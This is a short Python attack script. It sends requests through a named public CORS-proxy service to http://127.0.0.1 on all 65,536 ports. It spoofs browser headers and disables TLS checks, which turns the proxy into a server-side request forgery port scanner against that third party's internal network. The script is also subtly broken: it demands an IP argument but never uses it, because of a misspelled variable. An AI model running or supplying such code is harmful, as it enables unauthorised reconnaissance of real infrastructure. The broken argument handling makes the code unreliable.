#!/usr/bin/env python3
import requests
import concurrent.futures
import sys
import urllib3

def send_request(port):

    address = sys.argv[-1]
    try:
        url = f"https://hasura-cors-anywhere.herokuapp.com/http://127.0.0.1:{port}"
        headers = {'Host': 'hasura-cors-anywhere.herokuapp.com', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'https://hasura.io', 'Origin': 'https://hasura.io/', 'Connection': 'close'}

        resp = requests.get(url, headers=headers, verify=False, timeout=10)
        print(f"{str(port)} : {str(resp.status_code)} : {[len(resp.text)]}")
    except Exception as e:
        pass


def main():
    requests.packages.urllib3.disable_warnings()
    global address
    if len(sys.argv) !=2:
        print("Usage: ./req.py <ip>")
        sys.exit()
    assress = sys.argv[-1]
    ports = []
    for i in range(0,65536):
        ports.append(int(i))
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        executor.map(send_request, ports)


main()
